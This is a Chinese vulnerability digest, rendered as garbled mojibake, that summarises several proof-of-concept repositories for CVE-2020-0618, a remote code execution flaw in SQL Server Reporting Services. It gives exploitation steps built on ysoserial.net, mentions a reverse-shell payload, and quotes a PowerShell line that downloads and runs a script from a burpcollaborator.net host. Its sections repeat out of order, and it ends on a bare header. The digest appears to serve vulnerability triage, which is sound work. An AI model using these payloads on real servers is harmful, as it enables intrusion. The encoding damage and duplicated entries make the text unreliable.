è¯¥ PoC ä»£ç ä¸»è¦åˆ©ç”¨ `ysoserial.net` ç”Ÿæˆ Payloadï¼Œè¯¥ Payload è¾ƒä¸ºå¸¸è§ï¼Œä¸»è¦é£é™©å­˜åœ¨äºæ‰§è¡Œçš„ Powershell è„šæœ¬ã€‚è„šæœ¬å†…å®¹æœ¬èº«æ˜¯ä¸ºäº†å»ºç«‹åå‘ shellï¼Œä½†è‹¥æ”»å‡»è€…ä¿®æ”¹è„šæœ¬ä¸­çš„ IP åœ°å€æˆ–ç«¯å£ï¼Œå¯èƒ½å¯¼è‡´å—å®³è€…è¿æ¥åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ï¼Œä»è€Œæ³„éœ²ä¿¡æ¯æˆ–è¢«è¿›ä¸€æ­¥æ§åˆ¶ã€‚ä»“åº“æœ¬èº«ä¹Ÿå¯èƒ½è¢«å…¶ä»–äººç¯¡æ”¹ã€‚ç»¼åˆè€ƒè™‘ï¼ŒæŠ•æ¯’é£é™©çº¦ä¸º 10%ã€‚

**é¡¹ç›®åœ°å€:** [euphrat1ca/CVE-2020-0618](https://github.com/euphrat1ca/CVE-2020-0618)

**æ¼æ´è¯¦æƒ…:** [CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618)

---

## POC #3

**æ¥æº**: [CVE-2020-0618-itstarsec_CVE-2020-0618.md](../2020/CVE-2020-0618-itstarsec_CVE-2020-0618.md)

## CVE-2020-0618 - Microsoft SQL Server Reporting Services RCE

**æ¼æ´ç¼–å·:** CVE-2020-0618

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Microsoft SQL Server Reporting Services (SSRS)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æ§åˆ¶

**å½±å“ç‰ˆæœ¬:** å—å½±å“ç‰ˆæœ¬åŒ…æ‹¬SQL Server 2012 SP4, 2014 SP3, 2016 SP2 ç­‰ï¼Œå…·ä½“å‚è€ƒæ¼æ´åº“ä¿¡æ¯

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦èƒ½å¤Ÿè®¿é—®SSRSæœåŠ¡çš„webé¡µé¢

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2020-0618æ˜¯ä¸€ä¸ªå­˜åœ¨äºMicrosoft SQL Server Reporting Servicesä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚è¯¥æ¼æ´æ˜¯ç”±äºSSRSæœªèƒ½æ­£ç¡®å¤„ç†é¡µé¢è¯·æ±‚å¯¼è‡´çš„ï¼Œæ›´å…·ä½“åœ°è¯´ï¼Œæ˜¯ç”±äº`ViewState`ååºåˆ—åŒ–æ¼æ´ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡å‘é€ç‰¹åˆ¶çš„é¡µé¢è¯·æ±‚ï¼Œåˆ©ç”¨ä¸å®‰å…¨çš„`LosFormatter`ååºåˆ—åŒ–è¿‡ç¨‹æ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„POCä»£ç çœ‹èµ·æ¥æœ‰æ•ˆã€‚å®ƒä½¿ç”¨äº†`ysoserial.net`å·¥å…·ç”Ÿæˆæ¶æ„çš„åºåˆ—åŒ–payloadï¼Œå¹¶ä½¿ç”¨`TypeConfuseDelegate` gadgetï¼Œè¯¥gadgetå¸¸ç”¨äº.NETååºåˆ—åŒ–æ¼æ´çš„åˆ©ç”¨ã€‚Payloadä¸­åµŒå…¥äº†powershellå‘½ä»¤ï¼Œç”¨äºæ‰§è¡Œä»»æ„ä»£ç ï¼Œä¾‹å¦‚é€šè¿‡`iwr`ä¸‹è½½å¹¶æ‰§è¡Œè¿œç¨‹è„šæœ¬ã€‚

**æŠ•æ¯’é£é™©ï¼š**
è¯¥ä»“åº“å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ã€‚è™½ç„¶ä¸»è¦çš„æ¼æ´åˆ©ç”¨ä»£ç çœ‹èµ·æ¥æ˜¯åˆç†çš„ï¼Œä½†ä»¥ä¸‹å‡ ç‚¹éœ€è¦æ³¨æ„ï¼š
*   POCä»£ç ä¸­çš„`iwr("https://qoigyuef2a4z1a7rsir6lvi3eukl8a.burpcollaborator.net/In")|iex'`ï¼Œè¯¥URLæŒ‡å‘ä¸€ä¸ªå¤–éƒ¨èµ„æºï¼Œå¦‚æœè¯¥èµ„æºè¢«ç¯¡æ”¹ï¼Œåˆ™å¯èƒ½å¯¼è‡´æ‰§è¡Œæ¶æ„ä»£ç ã€‚
*   è™½ç„¶åˆ©ç”¨ä»£ç çœ‹èµ·æ¥åƒæ˜¯åˆæ³•çš„åˆ©ç”¨ï¼Œä½†ä»ç„¶è¦è°¨æ…ï¼Œç”±äº `burpcollaborator.net` åŸŸåæ˜¯ä¸€ç§å¸¸ç”¨çš„æ¸—é€æµ‹è¯•å·¥å…·ï¼Œè™½ç„¶åœ¨æœ¬æ¬¡ä¸Šä¸‹æ–‡ä¸­ä¸ä¸€å®šæ˜¯æ¶æ„çš„ï¼Œä½†ä¹Ÿå¢åŠ äº†æŠ•æ¯’çš„æ¦‚ç‡.
ç»¼åˆè€ƒè™‘ï¼Œè¯„ä¼°æŠ•æ¯’é£é™©ä¸º10%ã€‚ä¸»è¦é£é™©åœ¨äºå¤–éƒ¨URLå’Œæ½œåœ¨çš„payloadã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…é¦–å…ˆéœ€è¦ç¡®å®šç›®æ ‡SSRSæœåŠ¡å™¨å­˜åœ¨CVE-2020-0618æ¼æ´ã€‚
2.  ä½¿ç”¨`ysoserial.net`å·¥å…·ï¼ŒåŸºäº`TypeConfuseDelegate` gadgetå’Œ`LosFormatter`æ ¼å¼ï¼Œç”ŸæˆåŒ…å«æ¶æ„powershellå‘½ä»¤çš„åºåˆ—åŒ–payloadã€‚
3.  æ¶æ„powershellå‘½ä»¤ä¼šè¢«ç¼–ç æˆBase64å­—ç¬¦ä¸²ã€‚
4.  æ”»å‡»è€…æ„é€ åŒ…å«è¯¥payloadçš„æ¶æ„è¯·æ±‚ï¼Œå‘é€åˆ°SSRSæœåŠ¡å™¨çš„webé¡µé¢ã€‚æ¼æ´åˆ©ç”¨é“¾å¤§è‡´å¦‚ä¸‹ï¼šç½‘é¡µè¯·æ±‚->ViewState->LosFormatterååºåˆ—åŒ–->TypeConfuseDelegate -> Powershell RCE
5.  SSRSæœåŠ¡å™¨åœ¨å¤„ç†è¯·æ±‚æ—¶ï¼Œä¼šååºåˆ—åŒ–`ViewState`ï¼Œç”±äº`LosFormatter`çš„ä¸å®‰å…¨æ€§ï¼Œä¼šå¯¼è‡´ä»£ç æ‰§è¡Œã€‚`TypeConfuseDelegate` gadgetä¼šå°†ååºåˆ—åŒ–è¿‡ç¨‹å¯¼å‘æ¶æ„ä»£ç ã€‚
6.  æœ€ç»ˆï¼ŒæœåŠ¡å™¨ä¼šæ‰§è¡Œpayloadä¸­åµŒå…¥çš„powershellå‘½ä»¤ï¼Œæ”»å‡»è€…ä»è€Œè·å¾—è¿œç¨‹ä»£ç æ‰§è¡Œçš„èƒ½åŠ›ã€‚

**é¡¹ç›®åœ°å€:** [itstarsec/CVE-2020-0618](https://github.com/itstarsec/CVE-2020-0618)

**æ¼æ´è¯¦æƒ…:** [CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618)

---

## POC #4

**æ¥æº**: [CVE-2020-0618-wortell_cve-2020-0618.md](../2020/CVE-2020-0618-wortell_cve-2020-0618.md)

## CVE-2020-0618 Microsoft SQL Server Reporting Services RCE Honeypot

**æ¼æ´ç¼–å·:** CVE-2020-0618

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Microsoft SQL Server Reporting Services (SSRS)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨è¢«å®Œå…¨æ§åˆ¶

**å½±å“ç‰ˆæœ¬:** å—å½±å“ç‰ˆæœ¬åŒ…æ‹¬ä½†ä¸é™äºï¼šMicrosoft SQL Server 2012, 2014, 2016

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦èƒ½å¤Ÿè®¿é—®å­˜åœ¨æ¼æ´çš„SSRSæœåŠ¡ï¼Œé€šå¸¸æ˜¯WebæœåŠ¡ç«¯å£

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2020-0618æ˜¯ä¸€ä¸ªMicrosoft SQL Server Reporting Services (SSRS) ä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ŒæºäºSSRSæœªèƒ½æ­£ç¡®å¤„ç†é¡µé¢è¯·æ±‚ã€‚è¯¥æ¼æ´æ˜¯ç”±äº.NET ViewStateååºåˆ—åŒ–æ—¶æœªè¿›è¡Œå……åˆ†çš„è¾“å…¥éªŒè¯å¯¼è‡´çš„ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**
æ ¹æ®æä¾›çš„æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œè¯¥æ¼æ´æ˜¯çœŸå®å­˜åœ¨çš„ï¼Œå¹¶ä¸”æœ‰å…¬å¼€çš„PoCï¼ˆProof of Conceptï¼‰ä»£ç å¯ç”¨ã€‚æä¾›çš„ä»£ç æ˜¯ä¸€ä¸ªèœœç½ï¼Œæ—¨åœ¨æ£€æµ‹åˆ©ç”¨CVE-2020-0618çš„æ”»å‡»å°è¯•ï¼Œè€Œä¸æ˜¯ç›´æ¥åˆ©ç”¨è¯¥æ¼æ´ã€‚èœœç½é€šè¿‡æ¨¡æ‹ŸSSRSæœåŠ¡ï¼Œè®°å½•æ‰€æœ‰è¯·æ±‚ï¼Œç‰¹åˆ«æ˜¯é‚£äº›è¯•å›¾è§¦å‘æ¼æ´çš„è¯·æ±‚ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
åˆ©ç”¨æ–¹å¼é€šå¸¸æ¶‰åŠæ„é€ æ¶æ„çš„.NET ViewStateï¼Œå°†å…¶ä½œä¸ºè¯·æ±‚çš„ä¸€éƒ¨åˆ†å‘é€åˆ°SSRSæœåŠ¡å™¨ã€‚æœåŠ¡å™¨åœ¨ååºåˆ—åŒ–ViewStateæ—¶ï¼Œä¼šæ‰§è¡Œæ”»å‡»è€…é¢„å…ˆè®¾å®šçš„æ¶æ„ä»£ç ï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚æ”»å‡»è€…å¯èƒ½éœ€è¦å…ˆæ‰¾åˆ°æœ‰æ•ˆçš„ViewStateï¼Œç„¶åæ›¿æ¢å…¶ä¸­çš„éƒ¨åˆ†å†…å®¹ï¼Œæˆ–è€…ç”Ÿæˆå…¨æ–°çš„æ¶æ„ViewStateã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**
è¯¥ä»£ç åº“ä¸»è¦æ˜¯ä¸€ä¸ªèœœç½ï¼Œå…¶ç›®çš„æ˜¯**æ£€æµ‹**è€Œé**åˆ©ç”¨**æ¼æ´ã€‚ ä»£ç åŒ…å«ç”¨äºæ¨¡æ‹ŸSSRSæœåŠ¡å™¨è¡Œä¸ºçš„éƒ¨åˆ†ï¼Œä»¥åŠç”¨äºè®°å½•è¯·æ±‚å’Œé”™è¯¯çš„æ—¥å¿—è®°å½•åŠŸèƒ½ã€‚ ä½†æ˜¯,ä»ç„¶å­˜åœ¨ä¸€äº›æ½œåœ¨çš„æŠ•æ¯’é£é™©ï¼Œä¾‹å¦‚ï¼š

*   **è™šå‡æ—¥å¿—ï¼š** æ”»å‡»è€…å¯ä»¥ä¿®æ”¹æ—¥å¿—è®°å½•éƒ¨åˆ†ï¼Œä½¿å…¶æŠ¥å‘Šè™šå‡ä¿¡æ¯ï¼Œè¯¯å¯¼å®‰å…¨åˆ†æäººå‘˜ã€‚
*   **èµ„æºæ¶ˆè€—ï¼š** æ”»å‡»è€…å¯èƒ½ä¿®æ”¹ä»£ç ï¼Œä½¿å…¶åœ¨æ¥æ”¶åˆ°ç‰¹å®šç±»å‹çš„è¯·æ±‚æ—¶æ¶ˆè€—å¤§é‡èµ„æºï¼Œå¯¼è‡´æ‹’ç»æœåŠ¡ã€‚

è€ƒè™‘åˆ°ä»£ç åº“çš„èœœç½æ€§è´¨å’Œç°æœ‰åŠŸèƒ½ï¼Œåˆ¤å®šæŠ•æ¯’é£é™©è¾ƒä½ï¼Œä½†ä¸èƒ½å®Œå…¨æ’é™¤ã€‚ é£é™©è¯„ä¼°åœ¨5%ã€‚

**é¡¹ç›®åœ°å€:** [wortell/cve-2020-0618](https://github.com/wortell/cve-2020-0618)

**æ¼æ´è¯¦æƒ…:** [CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618)

---



---

## POC #2

**æ¥æº**: [CVE-2020-0618-euphrat1ca_CVE-2020-0618.md](../2020/CVE-2020-0618-euphrat1ca_CVE-2020-0618.md)

## CVE-2020-0618 - Microsoft SQL Server Reporting Services Remote Code Execution

**æ¼æ´ç¼–å·:** CVE-2020-0618

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Microsoft SQL Server Reporting Services (SSRS)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å¯¼è‡´å®Œå…¨æ§åˆ¶å—å½±å“çš„æœåŠ¡å™¨

**å½±å“ç‰ˆæœ¬:** å—å½±å“ç‰ˆæœ¬åŒ…æ‹¬SQL Server 2012 SP4 (QFE), SQL Server 2016 SP2 (CU), SQL Server 2014 SP3 (GDR/CU)

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦èƒ½å¤Ÿå‘ReportServer/pages/ReportViewer.aspxå‘é€POSTè¯·æ±‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2020-0618 æ˜¯ Microsoft SQL Server Reporting Services (SSRS) ä¸­çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚è¯¥æ¼æ´æºäº SSRS åœ¨å¤„ç†é¡µé¢è¯·æ±‚æ—¶å­˜åœ¨ä¸æ­£ç¡®çš„ååºåˆ—åŒ–æ“ä½œã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„ `ViewState` å‚æ•°ï¼Œå°†å…¶æ’å…¥åˆ°å‘å¾€ `ReportServer/pages/ReportViewer.aspx` çš„ POST è¯·æ±‚ä¸­ï¼Œåˆ©ç”¨ `LosFormatter` ååºåˆ—åŒ–å™¨æ‰§è¡Œä»»æ„ä»£ç ã€‚æä¾›çš„ PoC ä½¿ç”¨ `ysoserial.net` ç”Ÿæˆ Payloadï¼Œè¯¥ Payload ä½¿ç”¨ `TypeConfuseDelegate` gadget chainï¼Œå¹¶é€šè¿‡ PowerShell æ‰§è¡Œåå‘è¿æ¥ shell å‘½ä»¤ã€‚ 

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  ä½¿ç”¨ `ysoserial.net` å·¥å…·ç”Ÿæˆæ¶æ„çš„ `ViewState` Payloadã€‚
2.  å°† Payload æ’å…¥åˆ°å‘å¾€ `ReportServer/pages/ReportViewer.aspx` çš„ POST è¯·æ±‚çš„ `NavigationCorrector$ViewState` å‚æ•°ä¸­ã€‚
3.  å‘é€ç²¾å¿ƒæ„é€ çš„ POST è¯·æ±‚åˆ°ç›®æ ‡æœåŠ¡å™¨ã€‚
4.  å¦‚æœæ¼æ´åˆ©ç”¨æˆåŠŸï¼ŒæœåŠ¡å™¨å°†æ‰§è¡Œ Payload ä¸­åŒ…å«çš„æ¶æ„ä»£ç ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

è¯¥ PoC ä»£ç ä¸»è¦åˆ©ç”¨ `ysoserial.net` ç”Ÿæˆ Payloadï¼Œè¯¥ Payload è¾ƒä¸ºå¸¸è§ï¼Œä¸»è¦é£é™©å­˜åœ¨äºæ‰§è¡Œçš„ Powershell è„šæœ¬ã€‚è„šæœ¬å†…å®¹æœ¬èº«æ˜¯ä¸ºäº†å»ºç«‹åå‘ shellï¼Œä½†è‹¥æ”»å‡»è€…ä¿®æ”¹è„šæœ¬ä¸­çš„ IP åœ°å€æˆ–ç«¯å£ï¼Œå¯èƒ½å¯¼è‡´å—å®³è€…è¿æ¥åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ï¼Œä»è€Œæ³„éœ²ä¿¡æ¯æˆ–è¢«è¿›ä¸€æ­¥æ§åˆ¶ã€‚ä»“åº“æœ¬èº«ä¹Ÿå¯èƒ½è¢«å…¶ä»–äººç¯¡æ”¹ã€‚ç»¼åˆè€ƒè™‘ï¼ŒæŠ•æ¯’é£é™©çº¦ä¸º 10%ã€‚

**é¡¹ç›®åœ°å€:** [euphrat1ca/CVE-2020-0618](https://github.com/euphrat1ca/CVE-2020-0618)

**æ¼æ´è¯¦æƒ…:** [CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618)

---

## POC #3

**æ¥æº**: [CVE-2020-0618-itstarsec_CVE-2020-0618.md](../2020/CVE-2020-0618-itstarsec_CVE-2020-0618.md)

## CVE-2020-0618 - Microsoft SQL Server Reporting Services RCE

**æ¼æ´ç¼–å·:** CVE-2020-0618

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Microsoft SQL Server Reporting Services (SSRS)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æ§åˆ¶

**å½±å“ç‰ˆæœ¬:** å—å½±å“ç‰ˆæœ¬åŒ…æ‹¬SQL Server 2012 SP4, 2014 SP3, 2016 SP2 ç­‰ï¼Œå…·ä½“å‚è€ƒæ¼æ´åº“ä¿¡æ¯

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦èƒ½å¤Ÿè®¿é—®SSRSæœåŠ¡çš„webé¡µé¢

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2020-0618æ˜¯ä¸€ä¸ªå­˜åœ¨äºMicrosoft SQL Server Reporting Servicesä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚è¯¥æ¼æ´æ˜¯ç”±äºSSRSæœªèƒ½æ­£ç¡®å¤„ç†é¡µé¢è¯·æ±‚å¯¼è‡´çš„ï¼Œæ›´å…·ä½“åœ°è¯´ï¼Œæ˜¯ç”±äº`ViewState`ååºåˆ—åŒ–æ¼æ´ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡å‘é€ç‰¹åˆ¶çš„é¡µé¢è¯·æ±‚ï¼Œåˆ©ç”¨ä¸å®‰å…¨çš„`LosFormatter`ååºåˆ—åŒ–è¿‡ç¨‹æ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„POCä»£ç çœ‹èµ·æ¥æœ‰æ•ˆã€‚å®ƒä½¿ç”¨äº†`ysoserial.net`å·¥å…·ç”Ÿæˆæ¶æ„çš„åºåˆ—åŒ–payloadï¼Œå¹¶ä½¿ç”¨`TypeConfuseDelegate` gadgetï¼Œè¯¥gadgetå¸¸ç”¨äº.NETååºåˆ—åŒ–æ¼æ´çš„åˆ©ç”¨ã€‚Payloadä¸­åµŒå…¥äº†powershellå‘½ä»¤ï¼Œç”¨äºæ‰§è¡Œä»»æ„ä»£ç ï¼Œä¾‹å¦‚é€šè¿‡`iwr`ä¸‹è½½å¹¶æ‰§è¡Œè¿œç¨‹è„šæœ¬ã€‚

**æŠ•æ¯’é£é™©ï¼š**
è¯¥ä»“åº“å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ã€‚è™½ç„¶ä¸»è¦çš„æ¼æ´åˆ©ç”¨ä»£ç çœ‹èµ·æ¥æ˜¯åˆç†çš„ï¼Œä½†ä»¥ä¸‹å‡ ç‚¹éœ€è¦æ³¨æ„ï¼š
*   POCä»£ç ä¸­çš„`iwr("https://qoigyuef2a4z1a7rsir6lvi3eukl8a.burpcollaborator.net/In")|iex'`ï¼Œè¯¥URLæŒ‡å‘ä¸€ä¸ªå¤–éƒ¨èµ„æºï¼Œå¦‚æœè¯¥èµ„æºè¢«ç¯¡æ”¹ï¼Œåˆ™å¯èƒ½å¯¼è‡´æ‰§è¡Œæ¶æ„ä»£ç ã€‚
*   è™½ç„¶åˆ©ç”¨ä»£ç çœ‹èµ·æ¥åƒæ˜¯åˆæ³•çš„åˆ©ç”¨ï¼Œä½†ä»ç„¶è¦è°¨æ…ï¼Œç”±äº `burpcollaborator.net` åŸŸåæ˜¯ä¸€ç§å¸¸ç”¨çš„æ¸—é€æµ‹è¯•å·¥å…·ï¼Œè™½ç„¶åœ¨æœ¬æ¬¡ä¸Šä¸‹æ–‡ä¸­ä¸ä¸€å®šæ˜¯æ¶æ„çš„ï¼Œä½†ä¹Ÿå¢åŠ äº†æŠ•æ¯’çš„æ¦‚ç‡.
ç»¼åˆè€ƒè™‘ï¼Œè¯„ä¼°æŠ•æ¯’é£é™©ä¸º10%ã€‚ä¸»è¦é£é™©åœ¨äºå¤–éƒ¨URLå’Œæ½œåœ¨çš„payloadã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…é¦–å…ˆéœ€è¦ç¡®å®šç›®æ ‡SSRSæœåŠ¡å™¨å­˜åœ¨CVE-2020-0618æ¼æ´ã€‚
2.  ä½¿ç”¨`ysoserial.net`å·¥å…·ï¼ŒåŸºäº`TypeConfuseDelegate` gadgetå’Œ`LosFormatter`æ ¼å¼ï¼Œç”ŸæˆåŒ…å«æ¶æ„powershellå‘½ä»¤çš„åºåˆ—åŒ–payloadã€‚
3.  æ¶æ„powershellå‘½ä»¤ä¼šè¢«ç¼–ç æˆBase64å­—ç¬¦ä¸²ã€‚
4.  æ”»å‡»è€…æ„é€ åŒ…å«è¯¥payloadçš„æ¶æ„è¯·æ±‚ï¼Œå‘é€åˆ°SSRSæœåŠ¡å™¨çš„webé¡µé¢ã€‚æ¼æ´åˆ©ç”¨é“¾å¤§è‡´å¦‚ä¸‹ï¼šç½‘é¡µè¯·æ±‚->ViewState->LosFormatterååºåˆ—åŒ–->TypeConfuseDelegate -> Powershell RCE
5.  SSRSæœåŠ¡å™¨åœ¨å¤„ç†è¯·æ±‚æ—¶ï¼Œä¼šååºåˆ—åŒ–`ViewState`ï¼Œç”±äº`LosFormatter`çš„ä¸å®‰å…¨æ€§ï¼Œä¼šå¯¼è‡´ä»£ç æ‰§è¡Œã€‚`TypeConfuseDelegate` gadgetä¼šå°†ååºåˆ—åŒ–è¿‡ç¨‹å¯¼å‘æ¶æ„ä»£ç ã€‚
6.  æœ€ç»ˆï¼ŒæœåŠ¡å™¨ä¼šæ‰§è¡Œpayloadä¸­åµŒå…¥çš„powershellå‘½ä»¤ï¼Œæ”»å‡»è€…ä»è€Œè·å¾—è¿œç¨‹ä»£ç æ‰§è¡Œçš„èƒ½åŠ›ã€‚

**é¡¹ç›®åœ°å€:** [itstarsec/CVE-2020-0618](https://github.com/itstarsec/CVE-2020-0618)

**æ¼æ´è¯¦æƒ…:** [CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618)

---

## POC #4

**æ¥æº**: [CVE-2020-0618-wortell_cve-2020-0618.md](../2020/CVE-2020-0618-wortell_cve-2020-0618.md)

## CVE-2020-0618 Microsoft SQL Server Reporting Services RCE Honeypot

**æ¼æ´ç¼–å·:** CVE-2020-0618

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Microsoft SQL Server Reporting Services (SSRS)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨è¢«å®Œå…¨æ§åˆ¶

**å½±å“ç‰ˆæœ¬:** å—å½±å“ç‰ˆæœ¬åŒ…æ‹¬ä½†ä¸é™äºï¼šMicrosoft SQL Server 2012, 2014, 2016

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦èƒ½å¤Ÿè®¿é—®å­˜åœ¨æ¼æ´çš„SSRSæœåŠ¡ï¼Œé€šå¸¸æ˜¯WebæœåŠ¡ç«¯å£

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2020-0618æ˜¯ä¸€ä¸ªMicrosoft SQL Server Reporting Services (SSRS) ä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ŒæºäºSSRSæœªèƒ½æ­£ç¡®å¤„ç†é¡µé¢è¯·æ±‚ã€‚è¯¥æ¼æ´æ˜¯ç”±äº.NET ViewStateååºåˆ—åŒ–æ—¶æœªè¿›è¡Œå……åˆ†çš„è¾“å…¥éªŒè¯å¯¼è‡´çš„ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**
æ ¹æ®æä¾›çš„æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œè¯¥æ¼æ´æ˜¯çœŸå®å­˜åœ¨çš„ï¼Œå¹¶ä¸”æœ‰å…¬å¼€çš„PoCï¼ˆProof of Conceptï¼‰ä»£ç å¯ç”¨ã€‚æä¾›çš„ä»£ç æ˜¯ä¸€ä¸ªèœœç½ï¼Œæ—¨åœ¨æ£€æµ‹åˆ©ç”¨CVE-2020-0618çš„æ”»å‡»å°è¯•ï¼Œè€Œä¸æ˜¯ç›´æ¥åˆ©ç”¨è¯¥æ¼æ´ã€‚èœœç½é€šè¿‡æ¨¡æ‹ŸSSRSæœåŠ¡ï¼Œè®°å½•æ‰€æœ‰è¯·æ±‚ï¼Œç‰¹åˆ«æ˜¯é‚£äº›è¯•å›¾è§¦å‘æ¼æ´çš„è¯·æ±‚ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
åˆ©ç”¨æ–¹å¼é€šå¸¸æ¶‰åŠæ„é€ æ¶æ„çš„.NET ViewStateï¼Œå°†å…¶ä½œä¸ºè¯·æ±‚çš„ä¸€éƒ¨åˆ†å‘é€åˆ°SSRSæœåŠ¡å™¨ã€‚æœåŠ¡å™¨åœ¨ååºåˆ—åŒ–ViewStateæ—¶ï¼Œä¼šæ‰§è¡Œæ”»å‡»è€…é¢„å…ˆè®¾å®šçš„æ¶æ„ä»£ç ï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚æ”»å‡»è€…å¯èƒ½éœ€è¦å…ˆæ‰¾åˆ°æœ‰æ•ˆçš„ViewStateï¼Œç„¶åæ›¿æ¢å…¶ä¸­çš„éƒ¨åˆ†å†…å®¹ï¼Œæˆ–è€…ç”Ÿæˆå…¨æ–°çš„æ¶æ„ViewStateã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**
è¯¥ä»£ç åº“ä¸»è¦æ˜¯ä¸€ä¸ªèœœç½ï¼Œå…¶ç›®çš„æ˜¯**æ£€æµ‹**è€Œé**åˆ©ç”¨**æ¼æ´ã€‚ ä»£ç åŒ…å«ç”¨äºæ¨¡æ‹ŸSSRSæœåŠ¡å™¨è¡Œä¸ºçš„éƒ¨åˆ†ï¼Œä»¥åŠç”¨äºè®°å½•è¯·æ±‚å’Œé”™è¯¯çš„æ—¥å¿—è®°å½•åŠŸèƒ½ã€‚ ä½†æ˜¯,ä»ç„¶å­˜åœ¨ä¸€äº›æ½œåœ¨çš„æŠ•æ¯’é£é™©ï¼Œä¾‹å¦‚ï¼š

*   **è™šå‡æ—¥å¿—ï¼š** æ”»å‡»è€…å¯ä»¥ä¿®æ”¹æ—¥å¿—è®°å½•éƒ¨åˆ†ï¼Œä½¿å…¶æŠ¥å‘Šè™šå‡ä¿¡æ¯ï¼Œè¯¯å¯¼å®‰å…¨åˆ†æäººå‘˜ã€‚
*   **èµ„æºæ¶ˆè€—ï¼š** æ”»å‡»è€…å¯èƒ½ä¿®æ”¹ä»£ç ï¼Œä½¿å…¶åœ¨æ¥æ”¶åˆ°ç‰¹å®šç±»å‹çš„è¯·æ±‚æ—¶æ¶ˆè€—å¤§é‡èµ„æºï¼Œå¯¼è‡´æ‹’ç»æœåŠ¡ã€‚

è€ƒè™‘åˆ°ä»£ç åº“çš„èœœç½æ€§è´¨å’Œç°æœ‰åŠŸèƒ½ï¼Œåˆ¤å®šæŠ•æ¯’é£é™©è¾ƒä½ï¼Œä½†ä¸èƒ½å®Œå…¨æ’é™¤ã€‚ é£é™©è¯„ä¼°åœ¨5%ã€‚

**é¡¹ç›®åœ°å€:** [wortell/cve-2020-0618](https://github.com/wortell/cve-2020-0618)

**æ¼æ´è¯¦æƒ…:** [CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618)

---



---

## POC #2

